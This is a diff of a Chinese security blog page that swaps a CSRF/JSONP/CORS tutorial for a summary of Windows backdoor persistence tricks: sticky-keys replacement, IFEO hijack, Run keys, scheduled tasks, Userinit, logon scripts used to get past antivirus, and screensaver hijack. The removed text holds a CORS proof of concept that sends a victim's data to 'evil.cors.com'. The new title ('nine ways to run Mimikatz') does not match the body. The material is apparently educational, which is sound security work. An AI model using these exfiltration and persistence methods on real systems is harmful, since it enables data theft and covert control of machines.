@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>CSRF · H0e4a0r1t&#39;s Blog</title>
+    <title>九种姿势运行Mimikatz · H0e4a0r1t&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">H0e4a0r1t&#39;s Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">CSRF</a>
+                <a href="#" class="post-name">九种姿势运行Mimikatz</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            CSRF
+            九种姿势运行Mimikatz
             <!-- 404 -->
             
         </h1>
@@ -266,12 +266,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">841</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/05/04</span>
+                    <span class="post-intro-time">2019/10/29</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -395,50 +395,76 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="0x00-什么是CSRF？"><a href="#0x00-什么是CSRF？" class="headerlink" title="0x00.什么是CSRF？"></a>0x00.什么是CSRF？</h2><p>通俗简单点理解就是本该是你本人操作的步骤，攻击者已经给你模拟好了，而只差被系统误认为是你本人在操作，所以只需要你的好奇心驱使你点一下恶意链接，本质上就是你做的操作，只不过操作的value已经被攻击者设置好了，你只是负责触发，即只差你这个身份凭证了。</p>
-<h2 id="0x01-CSRF简单演示"><a href="#0x01-CSRF简单演示" class="headerlink" title="0x01.CSRF简单演示"></a>0x01.CSRF简单演示</h2><p>这里就拿DVWA来做演示</p>
-<p>正常用户修改密码操作，这里并未做任何用户凭证的校验</p>
-<p><img src="https://i.loli.net/2019/05/04/5ccd946d5eb7b.png" alt></p>
-<p>抓包，可以看到，模拟用户修改密码为123456并提交</p>
-<p><img src="https://i.loli.net/2019/05/04/5ccd946ccd03e.png" alt></p>
-<p>BurpSuite自带有构造CSRF的poc的工具</p>
-<p><img src="https://i.loli.net/2019/05/04/5ccd946d8ee72.png" alt></p>
-<p><img src="https://i.loli.net/2019/05/04/5ccd946d9de9d.png" alt></p>
-<p>也可以自己构造</p>
-<p><img src="https://i.loli.net/2019/05/04/5ccd946d7f0a1.png" alt></p>
-<p>CSRF表单自动提交代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;postxss&quot; method=&quot;post&quot; action=&quot;?前面的url&quot; hidden=&quot;hidden&quot;&gt;</span><br><span class="line">   &lt;input type=&quot;text&quot; name=&quot;&quot;(可从源代码中查看) value=&quot;想要设定的内容&quot; hidden=&quot;hidden&quot; /&gt;</span><br><span class="line">   &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.postxss.submit();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-JSONP劫持（读取型CSRF）"><a href="#0x02-JSONP劫持（读取型CSRF）" class="headerlink" title="0x02.JSONP劫持（读取型CSRF）"></a>0x02.JSONP劫持（读取型CSRF）</h2><h3 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h3><p>这里jsonp做跨域资源共享，通过callback回调函数来获取参数为foo的json格式的数据</p>
-<p><img src="https://i.loli.net/2019/05/04/5ccda1df6680a.png" alt></p>
-<p>构造POC</p>
-<p><img src="https://i.loli.net/2019/05/04/5ccda1df3ba5b.png" alt></p>
-<p>用户点开链接后即被劫持</p>
-<p><img src="https://i.loli.net/2019/05/04/5ccda1df5ed93.png" alt></p>
-<h2 id="0x03-CORS跨域读取"><a href="#0x03-CORS跨域读取" class="headerlink" title="0x03.CORS跨域读取"></a>0x03.CORS跨域读取</h2><p>挖掘思路：添加Ogrin头部信息，看返回的数据里面有没有Access-Control-Allow-Orgin这个参数出现如果有。尝试让他变成任意的url，如果在返回包里的Access-Control-Allow-Orgin这个参数后面的值有你放入的url，就可以进行cors劫持了。（acac支持传递cookie，acao支持跨域读取）</p>
-<h3 id="漏洞案例-1"><a href="#漏洞案例-1" class="headerlink" title="漏洞案例"></a>漏洞案例</h3><p>原打算放自己刚挖到的，后面因为poc传递格式还有些问题没有解决，所以找一篇案例吧</p>
-<p><a href="https://medium.com/@nahoragg/a-simple-cors-misconfig-leaked-private-post-of-twitter-facebook-instagram-5f1a634feb9d" target="_blank" rel="noopener">A Simple CORS Misconfig Leaked Private Post Of Twitter, Facebook &amp; Instagram</a></p>
-<p>在burp history中看到了有一个响应包中有<em>Access-Control-Allow-Origin:<a href="https://niche.co/" target="_blank" rel="noopener">https://niche.co</a> &amp; Access-Control-Allow-Credentials: true</em>,于是尝试通过在请求中发送自定义Origin头来进行利用，并发现服务器只检查“//niche.co”是否在Origin头中。例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Origin: https://evil.co , Access-Control-Allow-Origin: https://niche.co</span><br><span class="line">Origin: https://niche.co.evil.net, Access-Control-Allow-Origin: https://niche.co.evil.net</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2019/05/05/5ccf0615967ec.png" alt></p>
-<p>结合易受攻击的api和站点，我可以使用CORS（图像，电子邮件ID，个人资料信息，CSRF令牌等）窃取有关其他用户的任何信息，所以他做了以下POC：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;button type=&apos;button&apos; onclick=&apos;cors()&apos;&gt;CORS&lt;/button&gt;</span><br><span class="line">&lt;p id=&apos;demo&apos;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function cors() &#123;</span><br><span class="line">var xhttp = new XMLHttpRequest();</span><br><span class="line">xhttp.onreadystatechange = function() &#123;</span><br><span class="line">if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</span><br><span class="line">var a = this.responseText; // Sensitive data from niche.co about user account</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = a;</span><br><span class="line">xhttp.open(&quot;POST&quot;, &quot;http://evil.cors.com&quot;, true);// Sending that data to Attacker&apos;s website</span><br><span class="line">xhttp.withCredentials = true;</span><br><span class="line">console.log(a);</span><br><span class="line">xhttp.send(&quot;data=&quot;+a);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhttp.open(&quot;GET&quot;, &quot;https://www.niche.co/api/v1/users/*******&quot;, true);</span><br><span class="line">xhttp.withCredentials = true;</span><br><span class="line">xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="0x04-CSRF-bypass"><a href="#0x04-CSRF-bypass" class="headerlink" title="0x04.CSRF bypass"></a>0x04.CSRF bypass</h2><ul>
-<li>删除CSRF token / Referer / XRSF Header</li>
-<li>置空token参数</li>
-<li>修改请求方法  POST修改为GET</li>
-<li>与token相同长度的任意字符串替换token</li>
-<li>固定token   即攻击者的token放在被攻击者的请求中也可以使用</li>
-<li>组合利用  可利用xss获取csrf token</li>
-</ul>
-
+        <h2 id="windows中常见后门持久化方法总结"><a href="#windows中常见后门持久化方法总结" class="headerlink" title="windows中常见后门持久化方法总结"></a>windows中常见后门持久化方法总结</h2><h3 id="0x01-shift后门"><a href="#0x01-shift后门" class="headerlink" title="0x01. shift后门"></a>0x01. shift后门</h3><p>在windows中有一些辅助功能，能在用户未登录系统之前可以通过组合键来启动它，类似的辅助功能有：</p>
+<ol>
+<li>C:\Windows\System32\sethc.exe 粘滞键，启动快捷键：按五次shift键</li>
+<li>C:\Windows\System32\utilman.exe 设置中心，启动快捷键：Windows+U键 </li>
+</ol>
+<p>在低版本的windows中，我们可以直接把sethc.exe替换成我们的后门程序，下面我们把sethc.exe替换为calc.exe</p>
+<p><img src="https://i.loli.net/2019/10/30/fniFlCqz6y2U3cM.png" alt="1.png"></p>
+<p><img src="https://i.loli.net/2019/10/30/j3W5PTRNX94QrHb.png" alt="2.png"></p>
+<p><img src="https://i.loli.net/2019/10/30/9zqeJ42EnWQb8ax.png" alt="3.png"></p>
+<h3 id="0x02-映像劫持"><a href="#0x02-映像劫持" class="headerlink" title="0x02.映像劫持"></a>0x02.映像劫持</h3><p>和shift后门差不多，只不过在低版本的windows中，可以简单地替换程序，但是在高版本的windows版本中替换的文件受到了系统的保护，所以这里我们要使用另外一个知识点：映像劫持–也被称为”IFEO”（Image File Execution Options）简单来说就是当目标程序被映像劫持时，当我们启动目标程序时，启动的是劫持后的程序而不是原来的程序</p>
+<p>Image File Execution Options（其实应该称为”image Hijack”。）是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大。默认是只有管理员和local system有权读写修改。PS：来自百度百科</p>
+<p>在注册表的HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option下添加一个项utilman.exe，然后在utilman.exe这个项中添加debugger键，键值为我们恶意程序的路径，如下图</p>
+<p><img src="https://i.loli.net/2019/10/30/Oty63kjlI7VNKQW.png" alt="4.png"></p>
+<p><img src="https://i.loli.net/2019/10/30/YhOmVR56KLdgv9t.png" alt="5.png"></p>
+<p><img src="https://i.loli.net/2019/10/30/LBhnKZw1optx6cO.png" alt="6.png"></p>
+<p><img src="https://i.loli.net/2019/10/30/f3aJ5sPG6nWegAS.png" alt="7.png"></p>
+<h3 id="0x03-注册表自启动项"><a href="#0x03-注册表自启动项" class="headerlink" title="0x03. 注册表自启动项"></a>0x03. 注册表自启动项</h3><p>MSF的Persistence模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：Run和RunOnce，两者的区别如下:</p>
+<ol>
+<li><p>Run：该项下的键值即为开机启动项，每一次随着开机而启动。</p>
+</li>
+<li><p>RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除</p>
+</li>
+</ol>
+<p><strong>常见注册表启动项键的位置：</strong></p>
+<p>用户级</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>
+<p>系统级</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/10/30/qOrz5sPFKtvmEYZ.png" alt="8.png"></p>
+<p><img src="https://i.loli.net/2019/10/30/ziayFxOkTQtwY6V.png" alt="9.png"></p>
+<p>执行结果</p>
+<p><img src="https://i.loli.net/2019/10/30/xDtCbpqTGBaUPSO.gif" alt="1.gif"></p>
+<h3 id="0x04-定时任务"><a href="#0x04-定时任务" class="headerlink" title="0x04. 定时任务"></a>0x04. 定时任务</h3><p>windows下定时任务的命令有两个分别是：at和schtasks，他们两者主要区别是at命令在win7、08等高版本的windows中是不能将任务在前台执行的，也就是只会打开一个后台进程，而schtasks是将定时的任务在前台执行</p>
+<p>at的一些参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AT [\\computername] time [/INTERACTIVE]</span><br><span class="line">[ /EVERY:date[,...] | /NEXT:date[,...]] &quot;command&quot;</span><br></pre></td></tr></table></figure>
+<p>执行效果：</p>
+<p><img src="https://i.loli.net/2019/10/31/ZkdONrF6yJvhIWu.gif" alt="1.gif"></p>
+<p>schtasks一些参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain\]user /p password]] [/ru &#123;[Domain\]User | &quot;System&quot;&#125; [/rp Password]] /?</span><br></pre></td></tr></table></figure>
+<p>schtasks的执行如下：</p>
+<p><img src="https://i.loli.net/2019/10/31/1uDy34aonqcBImv.gif" alt="2.gif"></p>
+<h3 id="0x05-用户登陆初始化"><a href="#0x05-用户登陆初始化" class="headerlink" title="0x05. 用户登陆初始化"></a>0x05. 用户登陆初始化</h3><p>Userinit的作用是用户在进行登陆初始化设置时，WinLogon进程会执行指定的login scripts，所以我们可以修改它的键值来添加我们要执行的程序，注册表路径为：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit，我们添加一个我们启动的程序，多个程序用逗号隔开</p>
+<p><img src="https://i.loli.net/2019/10/31/wX57A68GZYIS3Ut.png" alt="1.png"></p>
+<p><img src="https://i.loli.net/2019/10/31/Ev5ArjigX8YNLcw.png" alt="2.png"></p>
+<p>效果如下：</p>
+<p><img src="https://i.loli.net/2019/10/31/s2vRAOVJtGyfCmK.gif" alt="1.gif"></p>
+<h3 id="0x06-Logon-Scripts"><a href="#0x06-Logon-Scripts" class="headerlink" title="0x06. Logon Scripts"></a>0x06. Logon Scripts</h3><p>Logon Scripts优先于av先执行，我们可以利用这一点来绕过av的敏感操作拦截</p>
+<p>注册表路径为：HKEY_CURRENT_USER\Environment，创建一个键为：UserInitMprLogonScript，其键值为我们要启动的程序路径</p>
+<p><img src="https://i.loli.net/2019/10/31/cXKdQ4Ea87HVoLz.png" alt="3.png"></p>
+<p><img src="https://i.loli.net/2019/10/31/TzKQBMhg2bq39Ur.gif" alt="2.gif"></p>
+<h3 id="0x07-屏幕保护程序"><a href="#0x07-屏幕保护程序" class="headerlink" title="0x07. 屏幕保护程序"></a>0x07. 屏幕保护程序</h3><p>在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的</p>
+<p>其中屏幕保护的配置存储在注册表中，其位置为：HKEY_CURRENT_USER\Control Panel\Desktop，关键键值如下：</p>
+<ol>
+<li>SCRNSAVE.EXE - 默认屏幕保护程序，我们可以把这个键值改为我们的恶意程序</li>
+<li>ScreenSaveActive - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态</li>
+<li>ScreenSaverTimeout - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）</li>
+</ol>
+<p><img src="https://i.loli.net/2019/10/31/5uWhFIqPerdLOb2.png" alt="4.png"></p>
+<p>10秒后触发屏幕保护程序</p>
+<p><img src="https://i.loli.net/2019/10/31/QNhMEFUjmiHt1xb.gif" alt="3.gif"></p>
+<h3 id="0x08-影子用户"><a href="#0x08-影子用户" class="headerlink" title="0x08. 影子用户"></a>0x08. 影子用户</h3><p>详情见<a href="https://h0e4a0r1t.github.io/2019/10/15/Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/" target="_blank" rel="noopener">https://h0e4a0r1t.github.io/2019/10/15/Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/</a></p>
+<h3 id="0x09-CLR"><a href="#0x09-CLR" class="headerlink" title="0x09. CLR"></a>0x09. CLR</h3>
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="http://yoursite.com">H1e4a0r1t</a>
-            </p><p>原文链接：<a href="http://yoursite.com/2019/05/04/csrf/">http://yoursite.com/2019/05/04/csrf/</a>
-            </p><p>发表日期：<a href="http://yoursite.com/2019/05/04/csrf/">May 4th 2019, 5:42:53 pm</a>
-            </p><p>更新日期：<a href="http://yoursite.com/2019/05/04/csrf/">May 8th 2019, 10:45:59 am</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2019/10/29/windows中常见后门持久化方法总结/">http://yoursite.com/2019/10/29/windows中常见后门持久化方法总结/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2019/10/29/windows中常见后门持久化方法总结/">October 29th 2019, 9:30:20 am</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/10/29/windows中常见后门持久化方法总结/">November 10th 2019, 2:35:11 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -447,16 +473,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/2019/05/05/wfuzz/" title="WFUZZ">
-                    <div class="nextTitle">WFUZZ</div>
+                <a href="/2019/11/01/九种姿势运行Mimikatz/" title="九种姿势运行Mimikatz">
+                    <div class="nextTitle">九种姿势运行Mimikatz</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/04/24/2019-4-23随记/" title="2019/4/23 随记">
-                    <div class="prevTitle">2019/4/23 随记</div>
+                <a href="/2019/10/15/Windows系统远程桌面的多用户登录/" title="Windows系统远程桌面的多用户登录">
+                    <div class="prevTitle">Windows系统远程桌面的多用户登录</div>
                 </a>
             
         </li>
@@ -575,7 +601,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">1.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-什么是CSRF？"><span class="toc-number">1.1.</span> <span class="toc-text">0x00.什么是CSRF？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-CSRF简单演示"><span class="toc-number">1.2.</span> <span class="toc-text">0x01.CSRF简单演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-JSONP劫持（读取型CSRF）"><span class="toc-number">1.3.</span> <span class="toc-text">0x02.JSONP劫持（读取型CSRF）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞案例"><span class="toc-number">1.3.1.</span> <span class="toc-text">漏洞案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-CORS跨域读取"><span class="toc-number">1.4.</span> <span class="toc-text">0x03.CORS跨域读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞案例-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">漏洞案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-CSRF-bypass"><span class="toc-number">1.5.</span> <span class="toc-text">0x04.CSRF bypass</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows中常见后门持久化方法总结"><span class="toc-number">1.</span> <span class="toc-text">windows中常见后门持久化方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-shift后门"><span class="toc-number">1.1.</span> <span class="toc-text">0x01. shift后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-映像劫持"><span class="toc-number">1.2.</span> <span class="toc-text">0x02.映像劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-注册表自启动项"><span class="toc-number">1.3.</span> <span class="toc-text">0x03. 注册表自启动项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-定时任务"><span class="toc-number">1.4.</span> <span class="toc-text">0x04. 定时任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-用户登陆初始化"><span class="toc-number">1.5.</span> <span class="toc-text">0x05. 用户登陆初始化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-Logon-Scripts"><span class="toc-number">1.6.</span> <span class="toc-text">0x06. Logon Scripts</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-屏幕保护程序"><span class="toc-number">1.7.</span> <span class="toc-text">0x07. 屏幕保护程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-影子用户"><span class="toc-number">1.8.</span> <span class="toc-text">0x08. 影子用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-CLR"><span class="toc-number">1.9.</span> <span class="toc-text">0x09. CLR</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
